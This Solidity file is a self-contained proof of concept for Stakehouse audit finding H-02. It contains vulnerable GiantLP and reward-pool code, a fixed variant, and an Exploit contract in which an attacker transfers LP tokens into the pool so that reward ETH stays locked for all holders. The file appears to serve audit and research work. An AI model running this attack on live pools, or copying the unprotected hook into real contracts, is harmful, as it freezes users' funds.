// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Stakehouse Protocol finding 43026
// (H-02): "Rewards of GiantMevAndFeesPool can be locked for all users".
//
// ROOT CAUSE (verbatim, unchanged):
//   GiantLP is a plain OpenZeppelin ERC20. Its inherited public `transfer` is
//   NOT protected, and its `_beforeTokenTransfer` / `_afterTokenTransfer` hooks
//   unconditionally forward to the GiantMevAndFeesPool. Nothing stops an LP
//   holder from transferring GiantLP into the pool contract ITSELF
//   (address(this)). Once the pool self-holds LP:
//     * that balance is still counted in `lpTokenETH.totalSupply()`, which is
//       the divisor used by SyndicateRewardsProcessor._updateAccumulatedETHPerLP,
//       so a fixed slice of every future reward is accrued to the pool's own
//       phantom share, and
//     * there is NO code path that ever distributes the pool's own share to a
//       real recipient (the pool never calls claimRewards for itself, and its
//       LP can never be moved out — it has no approver).
//   => that ETH is permanently LOCKED / frozen in the contract, unclaimable by
//      any honest LP. A single malicious `transfer` triggers it.
//
// The verbatim vulnerable source inlined below:
//   * GiantLP  (OZ ERC20 base + the two transfer hooks)                — GiantLP.sol
//   * SyndicateRewardsProcessor accounting core                        — SyndicateRewardsProcessor.sol
//     (accumulatedETHPerLPShare, totalClaimed, totalETHSeen, claimed,
//      PRECISION, _distributeETHRewardsToUserForToken,
//      _updateAccumulatedETHPerLP, totalRewardsReceived, receive)
//   * GiantMevAndFeesPool reward paths                                 — GiantMevAndFeesPool.sol
//     (beforeTokenTransfer, afterTokenTransfer, _setClaimedToMax,
//      updateAccumulatedETHPerLP, claimRewards, totalRewardsReceived)
//
// Stripped (NOT load-bearing for the lock): GiantPoolBase / StakingFundsVault
// deposit-and-stake machinery and the StakingFundsVault claim leg inside
// claimRewards. idleETH is kept but held at 0 (no idle depositor ETH), so the
// pool's totalRewardsReceived reduces to the base `balance + totalClaimed`.
// ─────────────────────────────────────────────────────────────────────────────

// ─────────────────────────────────────────────────────────────────────────────
// OpenZeppelin ERC20 (v4.x) — faithful base. The two transfer hooks are the
// vulnerable mechanism: `transfer` -> `_transfer` -> before/after hooks, and
// `_mint` -> before/after hooks. Kept byte-faithful at the hook call sites.
// ─────────────────────────────────────────────────────────────────────────────
abstract contract ERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) { return _name; }
    function symbol() public view virtual returns (string memory) { return _symbol; }
    function decimals() public view virtual returns (uint8) { return 18; }
    function totalSupply() public view virtual returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual returns (uint256) { return _balances[account]; }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

// ─────────────────────────────────────────────────────────────────────────────
// ITransferHookProcessor.sol (verbatim)
// ─────────────────────────────────────────────────────────────────────────────
interface ITransferHookProcessor {
    function beforeTokenTransfer(address _from, address _to, uint256 _amount) external;
    function afterTokenTransfer(address _from, address _to, uint256 _amount) external;
}

// ─────────────────────────────────────────────────────────────────────────────
// GiantLP.sol (verbatim) — the inherited `transfer` is UNPROTECTED and both
// hooks forward to the pool. This is the vulnerable target named in the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract GiantLP is ERC20 {

    /// @notice Address of giant pool that deployed the giant LP token
    address public pool;

    /// @notice Optional address of contract that will process transfers of giant LP
    ITransferHookProcessor public transferHookProcessor;

    /// @notice Last interacted timestamp for a given address
    mapping(address => uint256) public lastInteractedTimestamp;

    constructor(
        address _pool,
        address _transferHookProcessor,
        string memory _name,
        string memory _symbol
    ) ERC20(_name, _symbol) {
        pool = _pool;
        transferHookProcessor = ITransferHookProcessor(_transferHookProcessor);
    }

    function mint(address _recipient, uint256 _amount) external {
        require(msg.sender == pool, "Only pool");
        _mint(_recipient, _amount);
    }

    function burn(address _recipient, uint256 _amount) external {
        require(msg.sender == pool, "Only pool");
        _burn(_recipient, _amount);
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal virtual override {
        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).beforeTokenTransfer(_from, _to, _amount); // @> unprotected transfer hook: any holder may move LP anywhere, including into the pool itself
    }

    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal virtual override {
        lastInteractedTimestamp[_from] = block.timestamp;
        lastInteractedTimestamp[_to] = block.timestamp;
        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount); // @> unprotected after-hook: transferring LP INTO the pool makes it a permanent self-shareholder whose reward slice is never distributable -> ETH locked forever
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// GiantLPFixed — negative-control (recommended mitigation): protect the inherited
// transfer so GiantLP can never be moved INTO the pool (no self-held shares).
// ─────────────────────────────────────────────────────────────────────────────
contract GiantLPFixed is GiantLP {
    constructor(
        address _pool,
        address _transferHookProcessor,
        string memory _name,
        string memory _symbol
    ) GiantLP(_pool, _transferHookProcessor, _name, _symbol) {}

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override {
        // FIX: the pool must never become an LP holder of its own token.
        require(_to != pool, "GiantLP: cannot transfer to pool");
        super._beforeTokenTransfer(_from, _to, _amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// SyndicateRewardsProcessor.sol (verbatim accounting core)
// ─────────────────────────────────────────────────────────────────────────────
abstract contract SyndicateRewardsProcessor {

    /// @notice Emitted when ETH is received by the contract and processed
    event ETHReceived(uint256 amount);

    /// @notice Emitted when ETH from syndicate is distributed to a user
    event ETHDistributed(address indexed user, address indexed recipient, uint256 amount);

    /// @notice Precision used in rewards calculations for scaling up and down
    uint256 public constant PRECISION = 1e24;

    /// @notice Total accumulated ETH per share of LP<>KNOT that has minted derivatives scaled to 'PRECISION'
    uint256 public accumulatedETHPerLPShare;

    /// @notice Total ETH claimed by all users of the contract
    uint256 public totalClaimed;

    /// @notice Last total rewards seen by the contract
    uint256 public totalETHSeen;

    /// @notice Total ETH claimed by a given address for a given token
    mapping(address => mapping(address => uint256)) public claimed;

    /// @dev Any due rewards from node running can be distributed to msg.sender if they have an LP balance
    function _distributeETHRewardsToUserForToken(
        address _user,
        address _token,
        uint256 _balance,
        address _recipient
    ) internal {
        require(_recipient != address(0), "Zero address");
        uint256 balance = _balance;
        if (balance > 0) {
            // Calculate how much ETH rewards the address is owed / due
            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
            if (due > 0) {
                claimed[_user][_token] = due;

                totalClaimed += due;

                (bool success, ) = _recipient.call{value: due}("");
                require(success, "Failed to transfer");

                emit ETHDistributed(_user, _recipient, due);
            }
        }
    }

    /// @dev Internal logic for tracking accumulated ETH per share
    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {
        if (_numOfShares > 0) {
            uint256 received = totalRewardsReceived();
            uint256 unprocessed = received - totalETHSeen;

            if (unprocessed > 0) {
                emit ETHReceived(unprocessed);

                // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later
                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;

                totalETHSeen = received;
            }
        }
    }

    /// @notice Total rewards received by this contract from the syndicate
    function totalRewardsReceived() public virtual view returns (uint256) {
        return address(this).balance + totalClaimed;
    }

    /// @notice Allow the contract to receive ETH
    receive() external payable {}
}

// ─────────────────────────────────────────────────────────────────────────────
// GiantMevAndFeesPool reward paths (verbatim), with the deposit/stake machinery
// stripped. `GiantMevAndFeesPoolBase` holds the shared verbatim logic; the two
// concrete pools differ only in which GiantLP variant they deploy.
// ─────────────────────────────────────────────────────────────────────────────
abstract contract GiantMevAndFeesPoolBase is ITransferHookProcessor, SyndicateRewardsProcessor {
    GiantLP public lpTokenETH;
    uint256 public idleETH; // kept for fidelity; 0 in this reduction (no idle depositor ETH)

    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool
    /// @dev Verbatim reward path; the StakingFundsVault claim leg is stripped (external machinery).
    function claimRewards(address _recipient) external {
        updateAccumulatedETHPerLP();

        _distributeETHRewardsToUserForToken(
            msg.sender,
            address(lpTokenETH),
            lpTokenETH.balanceOf(msg.sender),
            _recipient
        );
    }

    /// @notice Distribute any new ETH received to LP holders
    function updateAccumulatedETHPerLP() public {
        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());
    }

    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed
    function beforeTokenTransfer(address _from, address _to, uint256) external {
        require(msg.sender == address(lpTokenETH), "Caller is not giant LP");
        updateAccumulatedETHPerLP();

        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped
        if (_from != address(0)) {
            _distributeETHRewardsToUserForToken(
                _from,
                address(lpTokenETH),
                lpTokenETH.balanceOf(_from),
                _from
            );
        }

        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped
        _distributeETHRewardsToUserForToken(
            _to,
            address(lpTokenETH),
            lpTokenETH.balanceOf(_to),
            _to
        );
    }

    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed
    function afterTokenTransfer(address, address _to, uint256) external {
        require(msg.sender == address(lpTokenETH), "Caller is not giant LP");
        _setClaimedToMax(_to);
    }

    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors
    function totalRewardsReceived() public view override returns (uint256) {
        return address(this).balance + totalClaimed - idleETH;
    }

    /// @dev Internal re-usable method for setting claimed to max for msg.sender
    function _setClaimedToMax(address _user) internal {
        // New ETH stakers are not entitled to ETH earned by
        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;
    }

    /// @dev Stripped stand-in for GiantPoolBase.depositETH: the pool mints LP to a
    ///      depositor. Minting fires the same _before/_afterTokenTransfer hooks the
    ///      real deposit path fires (afterTokenTransfer -> _setClaimedToMax).
    function depositMintLP(address _holder, uint256 _amount) external {
        lpTokenETH.mint(_holder, _amount);
    }
}

contract GiantMevAndFeesPool is GiantMevAndFeesPoolBase {
    constructor() {
        lpTokenETH = new GiantLP(address(this), address(this), "GiantETHLP", "gMevETH");
    }
}

contract GiantMevAndFeesPoolFixed is GiantMevAndFeesPoolBase {
    constructor() {
        lpTokenETH = new GiantLPFixed(address(this), address(this), "GiantETHLP", "gMevETH");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal marker ERC20 used ONLY to record the harmed magnitude (locked ETH) at
// the SINK. Not part of the vulnerable boundary.
// ─────────────────────────────────────────────────────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// LPHolder — a minimal EOA-like actor the Exploit controls, so victim and
// attacker act as distinct msg.senders (transfer / claim). Accepts ETH.
// ─────────────────────────────────────────────────────────────────────────────
contract LPHolder {
    receive() external payable {}

    function doTransfer(GiantLP _lp, address _to, uint256 _amount) external {
        _lp.transfer(_to, _amount);
    }

    function doClaim(GiantMevAndFeesPoolBase _pool) external {
        _pool.claimRewards(address(this));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: attacker transfers its GiantLP INTO the pool (self-hold).
// After rewards arrive, the pool's phantom share is permanently unclaimable by
// any honest LP -> ETH locked forever. Recorded on the LOCKED-ETH marker at SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant VICTIM_LP = 60 ether;
    uint256 internal constant ATTACKER_LP = 40 ether;
    uint256 internal constant REWARDS = 100 ether;

    // Exposed results.
    address public poolAddr;
    address public lpAddr;
    address public markerAddr;
    uint256 public lockedAmount;      // ETH stuck in the pool, unclaimable by any honest LP
    uint256 public victimReceived;    // ETH the honest victim managed to claim
    uint256 public attackerReceived;  // ETH the attacker can recover post-attack (0 = self-locked)
    uint256 public sinkMarkerBalance;

    function run() external payable {
        require(address(this).balance >= REWARDS, "fund exploit with >= REWARDS ETH");

        // --- deploy the real vulnerable pool (deploys GiantLP internally) ---
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();   // nonce 1
        LPHolder victim = new LPHolder();                       // nonce 2
        LPHolder attacker = new LPHolder();                     // nonce 3
        MiniToken marker = new MiniToken("Locked ETH", "LOCKED-ETH"); // nonce 4

        GiantLP lp = pool.lpTokenETH();
        poolAddr = address(pool);
        lpAddr = address(lp);
        markerAddr = address(marker);

        // --- honest deposits: victim and attacker receive LP (acc == 0 here) ---
        pool.depositMintLP(address(victim), VICTIM_LP);
        pool.depositMintLP(address(attacker), ATTACKER_LP);

        // --- ATTACK: attacker moves ALL its LP INTO the pool via the unprotected
        //     transfer. The pool now self-holds ATTACKER_LP, counted in totalSupply,
        //     but no path ever distributes the pool's own share to a real user. ---
        attacker.doTransfer(lp, address(pool), ATTACKER_LP);

        // --- rewards arrive AFTER the pool self-holds LP ---
        (bool ok, ) = payable(address(pool)).call{value: REWARDS}("");
        require(ok, "seed rewards");

        // --- honest victim claims everything it can ---
        uint256 vBefore = address(victim).balance;
        victim.doClaim(pool);
        victimReceived = address(victim).balance - vBefore;

        // --- attacker tries to recover: it holds 0 LP now, so it gets nothing ---
        uint256 aBefore = address(attacker).balance;
        attacker.doClaim(pool);
        attackerReceived = address(attacker).balance - aBefore;

        // --- HARM: whatever remains in the pool is the phantom self-share; no
        //     honest LP can ever claim it. It is permanently locked/frozen. ---
        lockedAmount = address(pool).balance;
        require(lockedAmount > 0, "no ETH locked");

        marker.mint(SINK, lockedAmount);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
